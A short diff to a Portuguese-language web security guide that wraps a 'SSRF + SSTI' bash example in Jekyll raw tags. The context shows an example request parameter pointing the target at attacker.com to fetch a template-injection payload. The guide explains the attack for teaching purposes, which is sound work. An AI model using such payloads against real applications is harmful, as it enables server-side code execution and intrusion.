@@ -788,6 +788,7 @@ Host: internal.host.com
 
 ### SSRF + SSTI (Combinação Perigosa)
 
+{% raw %}
 ```bash
 # Aplicação busca URL e renderiza conteúdo em template
 # 1. Criar servidor com conteúdo SSTI
@@ -800,6 +801,7 @@ Host: internal.host.com
 # Via SSRF:
 ?url=http://attacker.com/ssti-payload.txt
 ```
+{% endraw %}
 
 ---
 
